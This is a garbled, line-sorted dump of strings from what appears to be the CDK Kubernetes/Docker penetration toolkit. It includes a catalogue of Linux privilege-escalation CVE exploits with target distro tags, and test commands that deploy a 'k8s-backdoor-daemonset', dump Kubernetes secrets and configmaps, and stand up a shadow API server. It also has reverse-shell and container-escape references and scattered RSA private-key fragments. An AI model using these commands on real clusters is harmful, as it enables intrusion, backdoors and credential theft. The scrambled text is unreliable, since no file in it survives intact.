LevelLogger
LevelLogger) Close() {}
LevelLogger: LevelLogger{
List all available exploits:
Listen  bool
M3cz3IB5xlkM7X1SJk=
MFFWcvkIS/tQcRk01m1F5IRFswLeQ
MIIEowIBAAKCAQEAmOgs6bldjAbJrnPwn4Ffg8uh9LubOIcBV3ze9NHKuGL/oDt7
MODE=$(($MODE 
Major             string
ManagedFields []ManagedField 
Manager     string    
MatchFields []MatchField 
MaxFileByte        int64             // skip largefile
MaxFileByte:        1024 
MaxParallel int64
Message string
Metadata     Metadata       
Metadata   Metadata 
Metadata struct {
Method    string
Minor             string
More contributors
MountEscape()
MountInfo) bool {
MountPoint        string
Mounts
Name               string 
Name              string            
Name            string          
Name          string 
Name        string
Name        string      
Name    string      
Name  string 
Name string   
Name: ${txtgrn}[CVE-2004-0077]${txtrst} mremap_pte
Name: ${txtgrn}[CVE-2004-0186]${txtrst} samba
Name: ${txtgrn}[CVE-2004-1235]${txtrst} elflbl
Name: ${txtgrn}[CVE-2004-1235]${txtrst} krad3
Name: ${txtgrn}[CVE-2004-1235]${txtrst} uselib()
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl2
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl3
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl4
Name: ${txtgrn}[CVE-2006-2451]${txtrst} raptor_prctl
Name: ${txtgrn}[CVE-2006-3626]${txtrst} h00lyshit
Name: ${txtgrn}[CVE-2008-0600]${txtrst} vmsplice1
Name: ${txtgrn}[CVE-2008-0600]${txtrst} vmsplice2
Name: ${txtgrn}[CVE-2008-4210]${txtrst} exit_notify
Name: ${txtgrn}[CVE-2008-4210]${txtrst} ftrex
Name: ${txtgrn}[CVE-2009-1185]${txtrst} udev
Name: ${txtgrn}[CVE-2009-1185]${txtrst} udev 2
Name: ${txtgrn}[CVE-2009-2692]${txtrst} sock_sendpage (simple version)
Name: ${txtgrn}[CVE-2009-2698]${txtrst} hoagie_udp_sendmsg
Name: ${txtgrn}[CVE-2009-2698]${txtrst} ip_append_data
Name: ${txtgrn}[CVE-2009-2698]${txtrst} katon (udp_sendmsg)
Name: ${txtgrn}[CVE-2009-2698]${txtrst} the rebel (udp_sendmsg)
Name: ${txtgrn}[CVE-2009-3547]${txtrst} pipe.c 1
Name: ${txtgrn}[CVE-2009-3547]${txtrst} pipe.c 2
Name: ${txtgrn}[CVE-2009-3547]${txtrst} pipe.c 3
Name: ${txtgrn}[CVE-2010-0832]${txtrst} PAM MOTD
Name: ${txtgrn}[CVE-2010-1146]${txtrst} reiserfs
Name: ${txtgrn}[CVE-2010-2959]${txtrst} can_bcm
Name: ${txtgrn}[CVE-2010-3081]${txtrst} video4linux
Name: ${txtgrn}[CVE-2010-3301]${txtrst} ptrace_kmod2
Name: ${txtgrn}[CVE-2010-3437]${txtrst} pktcdvd
Name: ${txtgrn}[CVE-2010-3904]${txtrst} rds
Name: ${txtgrn}[CVE-2010-4170]${txtrst} SystemTap
Name: ${txtgrn}[CVE-2010-4347]${txtrst} american-sign-language
Name: ${txtgrn}[CVE-2011-1485]${txtrst} pkexec
Name: ${txtgrn}[CVE-2011-2921]${txtrst} ktsuss
Name: ${txtgrn}[CVE-2012-0056]${txtrst} memodipper
Name: ${txtgrn}[CVE-2012-0809]${txtrst} death_star (sudo)
Name: ${txtgrn}[CVE-2013-0268]${txtrst} msr
Name: ${txtgrn}[CVE-2013-1858]${txtrst} CLONE_NEWUSER
Name: ${txtgrn}[CVE-2013-1959]${txtrst} userns_root_sploit
Name: ${txtgrn}[CVE-2013-2094]${txtrst} perf_swevent
Name: ${txtgrn}[CVE-2013-2094]${txtrst} perf_swevent 2
Name: ${txtgrn}[CVE-2013-2094]${txtrst} semtex
Name: ${txtgrn}[CVE-2014-0038]${txtrst} timeoutpwn
Name: ${txtgrn}[CVE-2014-0038]${txtrst} timeoutpwn 2
Name: ${txtgrn}[CVE-2014-0196]${txtrst} rawmodePTY
Name: ${txtgrn}[CVE-2014-0476]${txtrst} chkrootkit
Name: ${txtgrn}[CVE-2014-2851]${txtrst} use-after-free in ping_init_sock() ${bldblu}(DoS)${txtrst}
Name: ${txtgrn}[CVE-2014-4014]${txtrst} inode_capable
Name: ${txtgrn}[CVE-2014-4699]${txtrst} ptrace/sysret
Name: ${txtgrn}[CVE-2014-4943]${txtrst} PPPoL2TP ${bldblu}(DoS)${txtrst}
Name: ${txtgrn}[CVE-2014-5119]${txtrst} __gconv_translit_find
Name: ${txtgrn}[CVE-2014-5207]${txtrst} fuse_suid
Name: ${txtgrn}[CVE-2015-1318]${txtrst} newpid (apport)
Name: ${txtgrn}[CVE-2015-1318]${txtrst} newpid (apport) 2
Name: ${txtgrn}[CVE-2015-1328]${txtrst} overlayfs
Name: ${txtgrn}[CVE-2015-1815]${txtrst} setroubleshoot
Name: ${txtgrn}[CVE-2015-1862]${txtrst} newpid (abrt)
Name: ${txtgrn}[CVE-2015-3202]${txtrst} fuse (fusermount)
Name: ${txtgrn}[CVE-2015-3246]${txtrst} userhelper
Name: ${txtgrn}[CVE-2015-3290]${txtrst} espfix64_NMI
Name: ${txtgrn}[CVE-2015-3315]${txtrst} raceabrt
Name: ${txtgrn}[CVE-2015-5287]${txtrst} abrt/sosreport-rhel7
Name: ${txtgrn}[CVE-2015-6565]${txtrst} not_an_sshnuke
Name: ${txtgrn}[CVE-2015-8612]${txtrst} blueman set_dhcp_handler d-bus privesc
Name: ${txtgrn}[CVE-2015-8660]${txtrst} overlayfs (ovl_setattr)
Name: ${txtgrn}[CVE-2015-9322]${txtrst} BadIRET
Name: ${txtgrn}[CVE-2016-0728]${txtrst} keyring
Name: ${txtgrn}[CVE-2016-1240]${txtrst} tomcat-rootprivesc-deb.sh
Name: ${txtgrn}[CVE-2016-1247]${txtrst} nginxed-root.sh
Name: ${txtgrn}[CVE-2016-1531]${txtrst} perl_startup (exim)
Name: ${txtgrn}[CVE-2016-1531]${txtrst} perl_startup (exim) 2
Name: ${txtgrn}[CVE-2016-2384]${txtrst} usb-midi
Name: ${txtgrn}[CVE-2016-4557]${txtrst} double-fdput()
Name: ${txtgrn}[CVE-2016-4989]${txtrst} setroubleshoot 2
Name: ${txtgrn}[CVE-2016-4997]${txtrst} target_offset
Name: ${txtgrn}[CVE-2016-5195]${txtrst} dirtycow
Name: ${txtgrn}[CVE-2016-5195]${txtrst} dirtycow 2
Name: ${txtgrn}[CVE-2016-5425]${txtrst} tomcat-RH-root.sh
Name: ${txtgrn}[CVE-2016-8655]${txtrst} chocobo_root
Name: ${txtgrn}[CVE-2016-9566]${txtrst} nagios-root-privesc
Name: ${txtgrn}[CVE-2016-9793]${txtrst} SO_{SND
Name: ${txtgrn}[CVE-2017-0358]${txtrst} ntfs-3g-modprobe
Name: ${txtgrn}[CVE-2017-1000112]${txtrst} NETIF_F_UFO
Name: ${txtgrn}[CVE-2017-1000253]${txtrst} PIE_stack_corruption
Name: ${txtgrn}[CVE-2017-1000367]${txtrst} Sudoer-to-root
Name: ${txtgrn}[CVE-2017-1000367]${txtrst} sudopwn
Name: ${txtgrn}[CVE-2017-16995]${txtrst} eBPF_verifier
Name: ${txtgrn}[CVE-2017-5618]${txtrst} setuid screen v4.5.0 LPE
Name: ${txtgrn}[CVE-2017-5899]${txtrst} s-nail-privget
Name: ${txtgrn}[CVE-2017-6074]${txtrst} dccp
Name: ${txtgrn}[CVE-2017-7308]${txtrst} af_packet
Name: ${txtgrn}[CVE-2018-1000001]${txtrst} RationalLove
Name: ${txtgrn}[CVE-2018-10900]${txtrst} vpnc_privesc.py
Name: ${txtgrn}[CVE-2018-14665]${txtrst} raptor_xorgy
Name: ${txtgrn}[CVE-2018-18955]${txtrst} subuid_shell
Name: ${txtgrn}[CVE-2018-5333]${txtrst} rds_atomic_free_op NULL pointer dereference
Name: ${txtgrn}[CVE-2019-10149]${txtrst} raptor_exim_wiz
Name: ${txtgrn}[CVE-2019-12181]${txtrst} Serv-U FTP Server
Name: ${txtgrn}[CVE-2019-13272]${txtrst} PTRACE_TRACEME
Name: ${txtgrn}[CVE-2019-15666]${txtrst} XFRM_UAF
Name: ${txtgrn}[CVE-2019-18634]${txtrst} sudo pwfeedback
Name: ${txtgrn}[CVE-2019-18862]${txtrst} GNU Mailutils 2.0 <= 3.7 maidag url local root (CVE-2019-18862)
Name: ${txtgrn}[CVE-2019-7304]${txtrst} dirty_sock
Name: ${txtgrn}[CVE-2020-9470]${txtrst} Wing FTP Server <= 6.2.5 LPE
Name: ${txtgrn}[CVE-2021-22555]${txtrst} Netfilter heap out-of-bounds write
Name: ${txtgrn}[CVE-2021-27365]${txtrst} linux-iscsi
Name: ${txtgrn}[CVE-2021-3156]${txtrst} sudo Baron Samedit
Name: ${txtgrn}[CVE-2021-3156]${txtrst} sudo Baron Samedit 2
Name: ${txtgrn}[CVE-2021-3490]${txtrst} eBPF ALU32 bounds tracking for bitwise ops
Name: ${txtgrn}[CVE-2021-4034]${txtrst} PwnKit
Name: ${txtgrn}[CVE-2022-0847]${txtrst} DirtyPipe
Name: ${txtgrn}[N/A]${txtrst} bluetooth
Name: ${txtgrn}[N/A]${txtrst} caps_to_root
Name: ${txtgrn}[N/A]${txtrst} caps_to_root 2
Name:/d' -e '/
NameList []string
NameList: []string{
Namespace         string            
Net Namespace
Network Information
Network string
New feature or exploits:
NodeAffinity NodeAffinity 
NodeName                     string        
NodeSelectorTerms []NodeSelectorTerm 
Note about Thin:
OS Basic Info
OUM42I0=
O][k
O][o
Operation   string    
Operator          string 
Operator string   
Options:
Opts              []string
OriginalInfo  string
OwnerRefs    map[string]string 
P][i
PassInnerArgs()
Phase             string             
PodData is from a pod yaml config for hit more pod security policy(https://kubernetes.io/docs/concepts/policy/pod-security-policy/) as below:
PodIP             string             
PodIPs            []PodIP            
Port    int
PortList    map[string]string
PortList: map[string]string{
PortScanner) Start() {
PortScanner{
Ports           []Port          
PostData  string
Preferences    struct{}  
Process Information
Project CDK is now included in 404Team [Starlink Project 2.0](https://github.com/knownsec/404StarLink2.0-Galaxy). Join the StarLink community to get in touch with CDK dev-team.
Protocol      string 
Q16bwMP3cOontH8FOep7tGV86Y7SQ=
QOSClass          string             
QlkV3mq8rfUaNsCqJ7ci93xwF39GsEALyVZ7LixShh5
RCV}BUFFORCE
RHEL and if we know distro version - direct mode)
RU97qa0FZT0QnZDg9Uc2dH0Ql513kFvHocz
R][e
R][o
Rank: 0
Rank: 1
Rank: 4
Rank: 5
ReBfzJrCY1pSN7KXBS8abTk=
Ready       bool        
Reason   string 
Reason string 
RedBold    = color.New(color.FgRed).Add(color.Bold)
RegexList          map[string]string // regex to match file text
RegexList: map[string]string{
Reqs: cmd:[ -u /usr/local/Serv-U/Serv-U ]
Reqs: cmd:[ -u /usr/local/sbin/maidag ]
Reqs: cmd:[ -x /etc/init.d/wftpserver ]
Reqs: pkg=exim
Reqs: pkg=glibc
Reqs: pkg=mysql-server
Reqs: pkg=networkmanager-vpnc
Reqs: pkg=nginx
Reqs: pkg=polkit
Reqs: pkg=setroubleshoot
Reqs: pkg=tomcat
Reqs:/d' -e '/
Request to Docker HTTP API
Request to Docker Registry API
Request to Docker Unix Socket
Request to K8s api-server
RequiredDuringSchedulingIgnoredDuringExecution struct {
ResourceVersion   string            
Resources       Resources       
ResponseMatch string
RestartCount int         
RestartPolicy                string        
RestartPolicy string                 
ReverseShell(args[0])
Root              string
Run 
Run targeted exploit:
Run() bool
Running    
S][e
SchedulerName                string        
SchedulerName string                 
Script
SearchAvailableCommands()
SearchLocalFilePath()
SearchLocalFileText(path)
SearchSensitiveEnv()
SearchSensitiveService()
SecurityContext              SecurityContext 
SecurityContext SecurityContext 
SecurityContext struct {
See the License for the specific language governing permissions and
Sensitive ENV
Sensitive Local Files
Sensitive Process
Server                   string 
Server    string
ServiceAccountName           string        
Silent    bool
SkipExecutableFile bool              // skip executable file
Spec         PodSpec        
Spec struct {
StartDir string
StartTime         time.Time          
Started     bool        
StartedAt time.Time 
State       ContainerState 
Status             string    
Status       PodStatus      
SuperBlockOptions []string
Supported
Sysctls []Sysctl 
T0U=
TBNwSE=
TCP Tunnel
THIS IS THE SLIM VERSION FOR DUMPING SECRET/AK IN SERVERLESS FUNCTIONS.
TLSClientConfig: 
TODO: extract machine arch from package listing
T][e
T][h
T][t
T][w
Tactics
Tags:
Tags: 
Tags: RHEL=5
Tags: RHEL=6
Tags: RHEL=6{libuser:0.56.13-(4
Tags: RHEL=7
Tags: RHEL=7{abrt:2.1.11-12.el7}
Tags: RHEL=7{sudo:1.8.6p7}
Tags: RHEL=8
Tags: centos=6
Tags: centos=7.4
Tags: debian=4
Tags: debian=6
Tags: debian=6.0{kernel:2.6.(31
Tags: debian=6.0{kernel:2.6.(32
Tags: debian=7
Tags: debian=7.0
Tags: debian=7.7
Tags: debian=8{blueman:1.23}
Tags: debian=9
Tags: debian=9{libc6:2.24-11
Tags: fedora=16 
Tags: fedora=20
Tags: fedora=21
Tags: fedora=4
Tags: mint=19
Tags: sparky=5
Tags: ubuntu=(10.04
Tags: ubuntu=(12.04
Tags: ubuntu=(13.04
Tags: ubuntu=(14.04
Tags: ubuntu=(20.04
Tags: ubuntu=(9.10
Tags: ubuntu=10
Tags: ubuntu=10.04
Tags: ubuntu=10.04{kernel:2.6.32-24-generic}
Tags: ubuntu=10.10
Tags: ubuntu=12.04
Tags: ubuntu=12.04{kernel:3.(2
Tags: ubuntu=13.10
Tags: ubuntu=14.04
Tags: ubuntu=14.04.2
Tags: ubuntu=14.04{kernel:4.4.0-
Tags: ubuntu=16.04.1
Tags: ubuntu=16.04{kernel:4.15.0-
Tags: ubuntu=16.04{kernel:4.4.0
Tags: ubuntu=16.04{kernel:4.4.0-21-generic}
Tags: ubuntu=16.04{kernel:4.8.0-(34
Tags: ubuntu=18
Tags: ubuntu=20.04{kernel:5.8.0-
Tags: ubuntu=20.04{kernel:5.8.0-(25
Tags: ubuntu=8.10
Tags: ubuntu=9.04
Tags: ubuntu=9.10
Tags:/d')
Tasks = make(map[string]TaskInterface)
Tasks[name] = task
Tasks[name].Exec()
Terminated 
TerminationGracePeriodSeconds int           
Thanks for the following contributors:
Thanks to private contributions and friends!
Time        time.Time 
Timeout     time.Duration
Timeout:     500 
Timeout: time.Duration(5) 
Timeout: time.Second 
TlsConfig 
To   int
Token     string
TokenPath = args[0]
TokenPath = conf.K8sSATokenDefaultPath
TokenPath string
TolerationSeconds 
Tolerations                  []Toleration  
Tool:
Transport: 
Type               string    
UID                string 
UID               string            
U][b
Uhjii9c3375IlDmR05bzxY404ZVSMo0=
UidMappings: []syscall.SysProcIDMap{
Unauthorized enumeration of ectd keys
Unshareflags: unix.CLONE_NEWUSER 
Url       string
Usage
Usage of CDK for attacking targets without prior mutual consent is illegal.
Usage/Example
Usage:
User    string 
User UserInfo 
Users          []User    
VERSION=v1.1
VERSION_ID=' /etc/
Value string 
Values   []string 
Verbose bool
VrEg=
WARNNING
W][i
Waiting    
WjYCduHsrkT7/EB5XEv4=
Wrapper {
Wrapper{
XAmznTraceId         string 
XB3Sampled           string 
XB3Spanid            string 
XB3Traceid           string 
XEnvoyAttemptCount   string 
XEnvoyPeerMetadata   string 
XEnvoyPeerMetadataId string 
YNuAtDBdko=
YellowBold = color.New(color.FgYellow).Add(color.Bold)
You may obtain a copy of the License at
Yts87kKdq0PP7pXfy6kDkUVs=
Zero-dependency cloudnative k8s/docker/serverless penetration toolkit by cdxy 
[![404tk](https://github.com/404tk.png
[![kingkaki](https://github.com/kingkaki.png
[![lazydog](https://github.com/yeahx.png
[![wywwzjj](https://github.com/wywwzjj.png
[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation.
[!] CAP_SYS_MODULE enabled. You can escape the container via loading kernel module. More info at https://xcellerator.github.io/posts/docker_escape/.
[-----BEGIN RSA PRIVATE KEY-----]
[0-9]//g' 
[A-Za-z0-9])
[AKIA99999999999999AB]
[CVE-[0-9]
[Contributors List](thanks.md)
[SKaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]
[TEST] [ECS] /root/cdk-fabric evaluate --full
[TEST] [ECS] docker ps 
[TEST] [ECS] docker stop $(docker ps -q) 
[TEST] [ECS] rm /tmp/ak-leakage
[TEST] [ECS] rm /tmp/mount-cgroup-success
[TEST] [ECS] rm /tmp/mount-procfs-success
[TEST] [ECS] rm /tmp/shim-pwn-success
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric         kcurl anonymous post 'https://172.21.0.1:443/api/v1/namespaces/default/pods
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric evaluate
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric kcurl
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric kcurl anonymous get https://172.21.0.1:443/api/v1/nodes
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric kcurl default get http://172.21.0.1:443/api/v1/nodes
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric kcurl default get https://172.21.0.1:443/api/v1/nodes
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run istio-check
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-backdoor-daemonset 1
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-backdoor-daemonset anonymous ubuntu
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-configmap-dump
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-configmap-dump /tmp/jkdhahdjfka2
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-configmap-dump auto
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-secret-dump
[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-secret-dump auto
[TEST] [Selfbuild k8s master node] kubectl cp /root/cdk-fabric myappnew:/cdk-fabric
[TEST] [Selfbuild k8s master node] kubectl delete pod kube-apiserver-cn-beijing.192.168.0.150-shadow -n kube-system
[TEST] [Selfbuild k8s master node] kubectl exec myappnew -- /cdk-fabric evaluate
[TEST] [Selfbuild k8s master node] kubectl exec myappnew -- /cdk-fabric run k8s-shadow-apiserver anonymous
[TEST] [Selfbuild k8s master node] kubectl exec myappnew -- /cdk-fabric run k8s-shadow-apiserver default
[TEST] [Selfbuild k8s master node] kubectl exec myappnew -- curl 192.168.0.150:9443
[TEST] [Selfbuild k8s master node] kubectl exec myappnew ls /cdk-fabric
[[0-9
[a-z0-9]
[compile and upload]
[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Cloud-Provider-Metadata-API)
[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Commands-and-Capabilities)
[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-API-Server)
[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-Service-Account)
[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Mounts)
[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Net-Namespace)
[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Sensitive-Files)
[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Services)
[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-System-Info)
[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-check-net.ipv4.conf.all.route_localnet)
[link](https://github.com/cdk-team/CDK/wiki/Tool:-dcurl)
[link](https://github.com/cdk-team/CDK/wiki/Tool:-ifconfig)
[link](https://github.com/cdk-team/CDK/wiki/Tool:-kcurl)
[link](https://github.com/cdk-team/CDK/wiki/Tool:-nc)
[link](https://github.com/cdk-team/CDK/wiki/Tool:-probe)
[link](https://github.com/cdk-team/CDK/wiki/Tool:-ps)
[link](https://github.com/cdk-team/CDK/wiki/Tool:-ucurl)
[link](https://github.com/cdk-team/CDK/wiki/Tool:-vi)
[link](https://github.com/kubernetes/dns/blob/master/docs/specification.md)
[upload] CDK binary to K8s pod:myappnew
[upload] CDK binary to self-build k8s master node
] %s
] Args: %v.
] Maybe you can exploit the 
] Maybe you can exploit the Capabilities below:
] Running exploit: %s.
](https://github.com/cdk-team/CDK/wiki/CDK-Home-CN)
_ = cmd.Run()
_ = conn.Close()
_ = w.Close()
__debug_bin
_darwin_386
_darwin_amd64
_freebsd_386
_freebsd_amd64
_freebsd_arm
_linux_386
_linux_amd64
_linux_arm
_netbsd_386
_netbsd_amd64
_netbsd_arm
_openbsd_386
_openbsd_amd64
_plan9_386
_windows_386
_windows_amd64
a := FromTo{
a = 1
a = NULL
absPath := GetDockerAbsPath()
actualStdout := captureStdout(func() {
add random ip addresses to confuse ip addresses
addCaps := getAddCaps(caps)
addProcCmd.Wait()
analysis-url: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
analysis-url: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
analysis-url: http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html
analysis-url: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
analysis-url: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
analysis-url: http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html
analysis-url: http://openwall.com/lists/oss-security/2015/04/14/4
analysis-url: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
analysis-url: http://seclists.org/fulldisclosure/2012/Jan/att-590/advisory_sudo.txt
analysis-url: http://seclists.org/oss-sec/2014/q2/430
analysis-url: http://seclists.org/oss-sec/2015/q2/130
analysis-url: http://seclists.org/oss-sec/2015/q2/520
analysis-url: http://seclists.org/oss-sec/2015/q2/717
analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
analysis-url: http://www.exim.org/static/doc/CVE-2016-1531.txt
analysis-url: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
analysis-url: http://www.openwall.com/lists/oss-security/2013/04/29/1
analysis-url: http://www.openwall.com/lists/oss-security/2014/06/10/4
analysis-url: http://www.openwall.com/lists/oss-security/2014/07/08/16
analysis-url: http://www.openwall.com/lists/oss-security/2015/08/04/8
analysis-url: http://www.openwall.com/lists/oss-security/2016/12/06/1
analysis-url: http://www.openwall.com/lists/oss-security/2017/01/26/2
analysis-url: http://www.openwall.com/lists/oss-security/2017/02/22/3
analysis-url: http://www.openwall.com/lists/oss-security/2017/08/13/1
analysis-url: http://www.securityfocus.com/archive/1/514379
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
analysis-url: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
analysis-url: https://blog.vastart.dev/2019/06/cve-2019-12181-serv-u-exploit-writeup.html
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail
analysis-url: https://c-skills.blogspot.com/2016/06/lets-feed-attacker-input-to-sh-c-to-see.html
analysis-url: https://cyseclabs.com/page
analysis-url: https://dirtypipe.cm4all.com/
analysis-url: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
analysis-url: https://dylankatz.com/Analysis-of-CVE-2019-18634/
analysis-url: https://git.zx2c4.com/CVE-2012-0056/about/
analysis-url: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bpf_syscall.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bug.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bug_on_data_corruption.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_credentials.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_list.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_notifiers.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_sg.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/devkmem.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/devmem.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/dmesg_restrict.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/fortify_source.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/hardened_usercopy.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/io_strict_devmem.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/kaslr.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/lkrg.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/mmap_min_addr.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/page_poisoning.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/pti.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/refcount_full.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/sched_stack_end_check.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slab_freelist_hardened.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slab_freelist_random.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slub_debug.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/smap.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/smep.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/stackprotector-regular.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/stackprotector-strong.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_devmem.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_kernel_rwx.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_module_rwx.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/user_ns.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/vmap_stack.md
analysis-url: https://github.com/mzet-/les-res/blob/master/features/yama_ptrace_scope.md
analysis-url: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
analysis-url: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
analysis-url: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
analysis-url: https://initblog.com/2019/dirty-sock/
analysis-url: https://jon.oberheide.org/blog/2010/04/10/reiserfs-reiserfs_priv-vulnerability/
analysis-url: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
analysis-url: https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html
analysis-url: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
analysis-url: https://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html
analysis-url: https://lwn.net/Articles/543273/
analysis-url: https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc
analysis-url: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
analysis-url: https://seclists.org/oss-sec/2017/q1/184
analysis-url: https://twitter.com/thegrugq/status/677809527882813440
analysis-url: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
analysis-url: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
analysis-url: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.php
analysis-url: https://www.mike-gualtieri.com/posts/finding-a-decade-old-flaw-in-gnu-mailutils
analysis-url: https://www.openwall.com/lists/oss-security/2011/08/13/2
analysis-url: https://www.openwall.com/lists/oss-security/2015/12/01/1
analysis-url: https://www.openwall.com/lists/oss-security/2017/01/27/7
analysis-url: https://www.qualys.com/2015/07/23/cve-2015-3245-cve-2015-3246/cve-2015-3245-cve-2015-3246.txt 
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
analysis-url: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
analysis-url: https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt
analysis-url: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
analysis-url: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
analysis-url: https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html
analysis-url: https://www.sudo.ws/alerts/linux_tty.html
analysis-url: https://xairy.github.io/blog/2016/cve-2016-2384
analysis-url: https://xorl.wordpress.com/2009/07/16/cve-2009-1895-linux-kernel-per_clear_on_setid-personality-bypass/
anonymous
anonymousLogin := evaluate.CheckK8sAnonymousLogin()
ans := []string{}
apiVersion: batch/v1
apiVersion: batch/v1beta1
apiVersion: extensions/v1beta1
apiVersion: rbac.authorization.k8s.io/v1
apiVersion: rbac.authorization.k8s.io/v1beta1
apiVersion: v1
argInsertReg := regexp.MustCompile(
args := tt.args
args []string
array[@]}
author: Andrea 'sorbo' Bittau
author: Andrey 'xairy' Konovalov
author: Andrey 'xairy' Konovalov (orginal exploit author)
author: Cary Cooper
author: Dawid Golunski
author: Denis Andzakovic
author: Federico Bento
author: FireFart (author of exploit at EDB 40839)
author: GRIMM
author: Guy Levin (orginal exploit author)
author: InitString
author: Jann Horn
author: Jann Horn (orginal exploit author)
author: Phil Oester
author: Qualys
author: Rafal 'n3rgal' Wojtczuk 
author: Rick Larabee
author: Sebastian Krahmer
author: Tavis Ormandy
author: Vitaly 'vnik' Nikolenko
author: VxHell Labs
author: andi
author: bcoles
author: berdav
author: blasty
author: blasty (original exploit author: Max Kellermann)
author: c0d3z3r0
author: chompie1337
author: halfdog
